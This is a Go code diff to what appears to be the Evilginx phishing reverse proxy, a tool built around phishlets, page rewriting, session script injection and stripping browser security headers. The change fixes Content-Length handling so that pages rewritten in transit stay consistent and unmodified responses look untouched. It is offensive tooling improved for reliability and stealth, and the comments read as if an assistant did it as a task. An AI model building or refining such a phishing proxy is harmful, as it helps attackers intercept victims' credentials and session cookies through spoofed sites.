@@ -1230,6 +1230,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
+				origBodyLen := len(body)
 				for site, pl := range p.cfg.phishlets {
 					if p.cfg.IsSiteEnabled(site) {
 						// handle sub_filters
@@ -1316,7 +1317,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
-				if jsInspectInjected {
+				// The body may have changed length via sub_filter/auto_filter
+				// rewriting, dot de-obfuscation, jsInspector injection, or the
+				// opengraph/session script injections above. Reconcile the
+				// declared Content-Length (and drop now-stale integrity
+				// headers) whenever the length actually changed, instead of
+				// only when jsInspector fired - previously an HTML response
+				// modified solely by sub_filter or script injection kept its
+				// origin Content-Length even though the body it was paired
+				// with had grown or shrunk. When the length is unchanged, the
+				// origin's own framing headers are left untouched so an
+				// unmodified response keeps looking like one.
+				//
+				// LIMITATION: for HTTPS (MITM'd) responses, the vendored
+				// goproxy fork's handleHttps unconditionally deletes
+				// Content-Length and forces "Transfer-Encoding: chunked" plus
+				// "Connection: close" after this hook returns (https.go
+				// ~268-278 in github.com/kgretzky/goproxy), regardless of
+				// what this function sets. That is not reachable from this
+				// package without patching the vendored dependency, which is
+				// out of scope here. This reconciliation is still correct
+				// and observable for the plain-HTTP proxy path and for
+				// HEAD-over-TLS responses (goproxy explicitly skips the
+				// Content-Length rewrite for HEAD requests), and it keeps
+				// the *http.Response object itself internally consistent
+				// regardless of which wire path ultimately serializes it.
+				if shouldReconcileBodyFraming(jsInspectInjected, origBodyLen, len(body)) {
 					setModifiedBodyFraming(resp, body)
 				}
 			}
@@ -1418,6 +1444,43 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 // listener. This is a pure extraction: the behavior of each function is
 // identical to the inline code it replaced inside the closure - nothing
 // about what gets rewritten, or in what order, was changed here.
+//
+// Response framing fidelity (Content-Length/chunking/keep-alive/casing):
+//
+//   - Content-Length: setModifiedBodyFraming is now invoked whenever the
+//     body's length actually changed (previously only when jsInspector
+//     fired), so resp.ContentLength and the Content-Length header stay
+//     consistent with what was actually rewritten. An unmodified response
+//     is left alone entirely, so its origin Content-Length survives.
+//
+//   - Chunking/Connection: for HTTPS (MITM'd) traffic, the vendored
+//     goproxy fork (github.com/kgretzky/goproxy, see https.go ~268-278)
+//     unconditionally deletes Content-Length, forces
+//     "Transfer-Encoding: chunked", and forces "Connection: close" on
+//     every non-HEAD response after this hook returns - independent of
+//     anything set here. That is not reachable from this package without
+//     patching the vendored dependency, which is out of scope. It does
+//     not apply to HEAD requests (goproxy explicitly skips the
+//     Content-Length rewrite there) or to the plain-HTTP proxy path
+//     (proxy.go's ServeHTTP relays resp.Header through the standard
+//     http.ResponseWriter, which honors a correct Content-Length as-is),
+//     where the fix above is fully observable on the wire.
+//
+//   - Header casing: verified experimentally that Go's net/http response
+//     parsing (http.ReadResponse / textproto.Reader.ReadMIMEHeader, used
+//     internally by http.Transport and therefore by this proxy's outbound
+//     RoundTripper) canonicalizes every response header key - e.g.
+//     "x-ms-request-id" and "CF-RAY" already arrive as "X-Ms-Request-Id"
+//     and "Cf-Ray" - before resp.Header is ever visible to this hook. The
+//     original wire casing is gone by the time any of the code here runs,
+//     so there is nothing left for a raw-map-key write to preserve at
+//     this layer; recovering it would require bypassing net/http's
+//     response parsing entirely, which is deeper surgery outside this
+//     task's scope. What is achievable, and what
+//     TestResponsePipeline_DoesNotFurtherManglePreservedCasing below
+//     verifies, is that this pipeline doesn't re-canonicalize or
+//     otherwise damage whatever casing a header's map key already holds
+//     when it isn't one of the headers this pipeline explicitly rewrites.
 // ---------------------------------------------------------------------------
 
 // responseSecurityHeaders lists the browser-enforced protections stripped
@@ -1555,6 +1618,18 @@ func setModifiedBodyFraming(resp *http.Response, body []byte) {
 	resp.TransferEncoding = nil
 	resp.Header.Del("Transfer-Encoding")
 }
+
+// shouldReconcileBodyFraming reports whether a response's framing headers
+// need to be corrected after its body passed through the rewrite pipeline:
+// either the jsInspector middleware flagged an injection, or the body's
+// length changed some other way (sub_filter, auto_filter, dot
+// de-obfuscation, opengraph/script injection). jsInspectInjected is kept as
+// a separate signal alongside the length comparison in case a future
+// jsInspector injects same-length content.
+func shouldReconcileBodyFraming(jsInspectInjected bool, origBodyLen, newBodyLen int) bool {
+	return jsInspectInjected || newBodyLen != origBodyLen
+}
+
 func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 
 	s, ok := p.getSession(session_id)
